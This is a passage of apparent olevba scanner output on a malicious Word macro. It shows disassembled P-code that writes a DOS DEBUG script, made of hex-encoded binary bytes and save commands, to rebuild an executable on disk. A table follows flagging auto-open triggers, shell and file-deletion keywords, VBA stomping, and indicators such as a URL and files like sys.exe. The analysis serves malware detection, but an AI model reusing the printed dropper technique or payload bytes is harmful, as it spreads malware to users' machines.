' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 12B0 2D 20 66 6C 6F 61 74 69 6E 67 2D 70 6F 69 6E 74"
' 	PrintItemNL 
' Line #918:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 12C0 20 73 75 70 70 6F 72 74 20 6E 6F 74 20 6C 6F 61"
' 	PrintItemNL 
' Line #919:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 12D0 64 65 64 0D 0A 00 FF FF FF 00 00 00 00 00 00 00"
' 	PrintItemNL 
' Line #920:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 12E0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
' 	PrintItemNL 
' Line #921:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 12F0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
' 	PrintItemNL 
' Line #922:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 1300 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
' 	PrintItemNL 
' Line #923:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 1310 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
' 	PrintItemNL 
' Line #924:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 1320 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
' 	PrintItemNL 
' Line #925:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 1330 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
' 	PrintItemNL 
' Line #926:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 1340 00 00 01 00 01 00 20 20 10 00 01 00 04 00 E8 02"
' 	PrintItemNL 
' Line #927:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 1350 00 00 01 00 00 00 00 00 00 00 00 00 00 00 00 00"
' 	PrintItemNL 
' Line #928:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 1360 28 00 00 00 20 00 00 00 40 00 00 00 01 00 04 00"
' 	PrintItemNL 
' Line #929:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 1370 00 00 00 00 80 02 00 00 00 00 00 00 00 00 00 00"
' 	PrintItemNL 
' Line #930:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 1380 00 00 00 00 00 00 00 00 00 00 00 00 00 00 80 00"
' 	PrintItemNL 
' Line #931:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 1390 00 80 00 00 00 80 80 00 80 00 00 00 80 00 80 00"
' 	PrintItemNL 
' Line #932:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 13A0 80 80 00 00 80 80 80 00 C0 C0 C0 00 00 00 FF 00"
' 	PrintItemNL 
' Line #933:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 13B0 00 FF 00 00 00 FF FF 00 FF 00 00 00 FF 00 FF 00"
' 	PrintItemNL 
' Line #934:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 13C0 FF FF 00 00 FF FF FF 00 00 00 00 00 00 00 00 00"
' 	PrintItemNL 
' Line #935:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 13D0 00 00 00 00 00 00 00 00 FF FF FF FF FF FF FF FF"
' 	PrintItemNL 
' Line #936:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 13E0 FF FF FF FF FF FF FF 00 FF FF FF FF FF FF FF FF"
' 	PrintItemNL 
' Line #937:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 13F0 FF FF FF FF FF FF FF 00 FF 9F FF FF FF FF FF FF"
' 	PrintItemNL 
' Line #938:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 1400 FF FF FF FF FF FF FF 00 FF 9F FF FF FF FF FF FF"
' 	PrintItemNL 
' Line #939:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 1410 FF FF FF FF FF FF FF 00 FF 9F FF FF FF FF FF FF"
' 	PrintItemNL 
' Line #940:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 1420 FF FF FF FF F9 FF FF 00 FF F9 99 9F FF FF FF FF"
' 	PrintItemNL 
' Line #941:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 1430 FF FF FF FF 9F 9F FF 00 FF FF FF F9 99 9F FF FF"
' 	PrintItemNL 
' Line #942:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 1440 FF FF FF F9 FF F9 FF 00 FF FF FF FF FF 9F FF FF"
' 	PrintItemNL 
' Line #943:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 1450 FF FF FF 9F FF FF FF 00 FF FF FF FF FF F9 FF FF"
' 	PrintItemNL 
' Line #944:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 1460 FF FF F9 FF FF FF FF 00 FF FF FF FF FF F9 9F FF"
' 	PrintItemNL 
' Line #945:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 1470 FF FF F9 FF FF FF FF 00 FF FF FF FF FF FF 9F FF"
' 	PrintItemNL 
' Line #946:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 1480 FF FF 99 FF FF FF FF 00 FF FF FF FF FF FF 99 99"
' 	PrintItemNL 
' Line #947:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 1490 99 99 9F FF FF FF FF 00 FF FF FF FF FF FF F9 99"
' 	PrintItemNL 
' Line #948:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 14A0 FF FF FF FF FF FF FF 00 FF FF FF FF FF FF F9 99"
' 	PrintItemNL 
' Line #949:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 14B0 FF FF FF FF FF FF FF 00 FF FF FF 9F FF FF FF 99"
' 	PrintItemNL 
' Line #950:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 14C0 9F FF FF F9 FF FF FF 00 FF FF FF F9 FF FF FF F9"
' 	PrintItemNL 
' Line #951:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 14D0 9F FF FF 9F 9F FF FF 00 FF FF FF FF 9F FF FF FF"
' 	PrintItemNL 
' Line #952:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 14E0 99 FF 99 FF F9 FF FF 00 FF FF FF FF F9 FF FF FF"
' 	PrintItemNL 
' Line #953:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 14F0 99 F9 FF FF FF 9F FF 00 FF FF FF FF FF 9F FF FF"
' 	PrintItemNL 
' Line #954:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 1500 99 9F FF FF FF FF FF 00 FF FF FF FF FF F9 99 99"
' 	PrintItemNL 
' Line #955:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 1510 99 9F FF FF FF FF FF 00 FF FF FF FF FF FF FF FF"
' 	PrintItemNL 
' Line #956:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 1520 FF 9F FF FF FF FF FF 00 FF FF FF FF FF FF FF FF"
' 	PrintItemNL 
' Line #957:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 1530 FF 99 99 FF FF FF FF 00 FF FF FF FF FF FF FF FF"
' 	PrintItemNL 
' Line #958:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 1540 FF F9 99 9F FF FF FF 00 FF FF FF FF FF FF FF FF"
' 	PrintItemNL 
' Line #959:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 1550 FF F9 99 99 FF FF FF 00 FF FF FF FF FF FF FF FF"
' 	PrintItemNL 
' Line #960:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 1560 FF FF 99 99 FF FF FF 00 FF FF FF FF FF FF FF FF"
' 	PrintItemNL 
' Line #961:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 1570 FF FF F9 9F FF FF FF 00 FF FF FF FF FF FF FF FF"
' 	PrintItemNL 
' Line #962:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 1580 FF FF FF FF FF FF FF 00 FF FF FF FF FF FF FF FF"
' 	PrintItemNL 
' Line #963:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 1590 FF FF FF FF FF FF FF 00 FF FF FF FF FF FF FF FF"
' 	PrintItemNL 
' Line #964:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 15A0 FF FF FF FF FF FF FF 00 00 00 00 00 00 00 00 00"
' 	PrintItemNL 
' Line #965:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 15B0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
' 	PrintItemNL 
' Line #966:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 15C0 00 00 00 00 00 00 00 00 FF FF FF FF 00 00 00 03"
' 	PrintItemNL 
' Line #967:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 15D0 00 00 00 03 00 00 00 03 00 00 00 03 00 00 00 03"
' 	PrintItemNL 
' Line #968:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 15E0 00 00 00 03 00 00 00 03 00 00 00 03 00 00 00 03"
' 	PrintItemNL 
' Line #969:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 15F0 00 00 00 03 00 00 00 03 00 00 00 03 00 00 00 03"
' 	PrintItemNL 
' Line #970:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 1600 00 00 00 03 00 00 00 03 00 00 00 03 00 00 00 03"
' 	PrintItemNL 
' Line #971:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 1610 00 00 00 03 00 00 00 03 00 00 00 03 00 00 00 03"
' 	PrintItemNL 
' Line #972:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 1620 00 00 00 03 00 00 00 03 00 00 00 03 00 00 00 03"
' 	PrintItemNL 
' Line #973:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 1630 00 00 00 03 00 00 00 03 00 00 00 03 00 00 00 03"
' 	PrintItemNL 
' Line #974:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 1640 FF FF FF FF FF FF FF FF 00 00 00 00 00 00 00 00"
' 	PrintItemNL 
' Line #975:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0003 "RCX"
' 	PrintItemNL 
' Line #976:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0004 "1550"
' 	PrintItemNL 
' Line #977:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0001 "W"
' 	PrintItemNL 
' Line #978:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0001 "Q"
' 	PrintItemNL 
' Line #979:
' 	Ld hFile 
' 	Close 0x0001 
' Line #980:
' 	EndSub 
' Line #981:
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Autoexec            |Runs when the Word document is opened        |
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoExit            |Runs when the Word document is closed        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|AutoExec  |AutoNew             |Runs when a new Word document is created     |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Open                |May open a file                              |
|Suspicious|write               |May write to a file (if combined with Open)  |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|vbHide              |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Run                 |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|command             |May run PowerShell commands                  |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |http://www.faxzu.vco|URL                                          |
|          |m.net               |                                             |
|IOC       |zap.bat             |Executable file name                         |
|IOC       |Dxdlg32.dll         |Executable file name                         |
|IOC       |start.scr           |Executable file name                         |
|IOC       |startv.bat          |Executable file name                         |
|IOC       |sys.exe             |Executable file name                         |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

